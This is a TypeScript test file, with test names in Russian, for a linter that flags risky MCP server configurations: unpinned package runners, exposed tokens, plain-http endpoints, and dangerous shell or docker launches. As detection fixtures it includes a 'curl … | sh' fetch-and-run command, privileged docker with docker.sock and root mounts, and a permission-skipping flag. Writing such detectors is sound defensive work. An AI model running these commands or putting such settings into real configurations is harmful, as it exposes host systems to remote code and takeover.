import assert from "node:assert/strict";
import { test } from "node:test";
import { checkServer } from "../src/rules/config.js";
import { ids, server } from "./helpers.js";

test("BSK009: npx без версии и с -y, с версией не срабатывает", () => {
  const f = checkServer(server("fs", "npx", ["-y", "@scope/server-fs", "/data"]));
  assert.ok(f.some((x) => x.rule === "BSK009" && x.message.includes("-y")));
  assert.deepEqual(ids(checkServer(server("fs", "npx", ["-y", "@scope/server-fs@1.4.2"]))), []);
  assert.deepEqual(ids(checkServer(server("fs", "npx", ["server-fs@2.0.0-beta.1"]))), []);
});

test("BSK009: uvx, pnpm dlx, pipx run, bunx", () => {
  assert.ok(ids(checkServer(server("a", "uvx", ["mcp-server-git"]))).includes("BSK009"));
  assert.deepEqual(ids(checkServer(server("a", "uvx", ["mcp-server-git==0.6.2"]))), []);
  assert.ok(ids(checkServer(server("a", "pnpm", ["dlx", "some-server"]))).includes("BSK009"));
  assert.ok(ids(checkServer(server("a", "pipx", ["run", "tool"]))).includes("BSK009"));
  assert.ok(ids(checkServer(server("a", "bunx", ["tool"]))).includes("BSK009"));
  assert.deepEqual(ids(checkServer(server("a", "node", ["server.js"]))), []);
});

test("BSK010: токены известных форматов и маскировка", () => {
  const secrets: [string, string][] = [
    ["GH", "ghp_" + "A1".repeat(18)], ["OAI", "sk-" + "a1B2".repeat(8)], ["AWS", "AKIA" + "ABCDEFGH12345678"],
    ["SLACK", "xoxb-1234567890-abcdefghij"], ["JWT", "eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0NTY.SflKxwRJSMeKKF2QT4"],
  ];
  for (const [k, v] of secrets) {
    const f = checkServer(server("s", "node", ["s.js"], { [k]: v })).find((x) => x.rule === "BSK010");
    assert.ok(f, k);
    assert.ok(!f?.evidence?.includes(v), `${k}: секрет не должен попасть в отчёт целиком`);
  }
});

test("BSK010: секрет в аргументах, в адресе и литерал в переменной с «секретным» именем", () => {
  assert.ok(ids(checkServer(server("s", "node", ["s.js", "--token", "ghp_" + "Z9".repeat(18)]))).includes("BSK010"));
  assert.ok(ids(checkServer(server("s", undefined, [], {}, "https://x.example/mcp?api_key=abcdef123456"))).includes("BSK010"));
  assert.equal(checkServer(server("s", "node", [], { MY_API_KEY: "plainliteralvalue123" })).find((f) => f.rule === "BSK010")?.severity, "medium");
});

test("BSK010: ссылки на переменные и заглушки не считаются секретами", () => {
  for (const v of ["${GITHUB_TOKEN}", "$GITHUB_TOKEN", "<your-token>", "changeme-please-now", "short"]) {
    assert.deepEqual(ids(checkServer(server("s", "node", [], { API_TOKEN: v }))), [], v);
  }
});

test("BSK011: http удалённо high, https info, localhost без находок", () => {
  assert.equal(checkServer(server("r", undefined, [], {}, "http://tools.example.net/mcp")).find((f) => f.rule === "BSK011")?.severity, "high");
  assert.equal(checkServer(server("r", undefined, [], {}, "https://tools.example.net/mcp")).find((f) => f.rule === "BSK011")?.severity, "info");
  assert.deepEqual(ids(checkServer(server("r", undefined, [], {}, "http://localhost:3000/mcp"))), []);
  assert.deepEqual(ids(checkServer(server("r", undefined, [], {}, "http://127.0.0.1:3000/mcp"))), []);
});

test("BSK012: shell -c с загрузкой и без, curl | sh, временная папка", () => {
  assert.equal(checkServer(server("s", "bash", ["-c", "curl https://x.example/i.sh | sh"])).find((f) => f.rule === "BSK012")?.severity, "high");
  assert.equal(checkServer(server("s", "sh", ["-c", "node server.js"])).find((f) => f.rule === "BSK012")?.severity, "medium");
  assert.ok(ids(checkServer(server("s", "/tmp/server"))).includes("BSK012"));
  assert.deepEqual(ids(checkServer(server("s", "bash", ["server.sh"]))), []);
});

test("BSK012: docker с привилегиями, docker.sock, монтированием корня и сетью хоста; флаги без защиты", () => {
  const d = (...a: string[]) => checkServer(server("s", "docker", ["run", ...a, "img:1"])).filter((f) => f.rule === "BSK012");
  assert.ok(d("--privileged").length);
  assert.ok(d("-v", "/var/run/docker.sock:/var/run/docker.sock").length);
  assert.ok(d("-v", "/:/host").length);
  assert.ok(d("-v", "~:/home").length);
  assert.ok(d("--network", "host").some((f) => f.severity === "medium"));
  assert.deepEqual(d("--rm", "-i", "-v", "/srv/data:/data:ro"), []);
  assert.ok(ids(checkServer(server("s", "node", ["s.js", "--dangerously-skip-permissions"]))).includes("BSK012"));
});
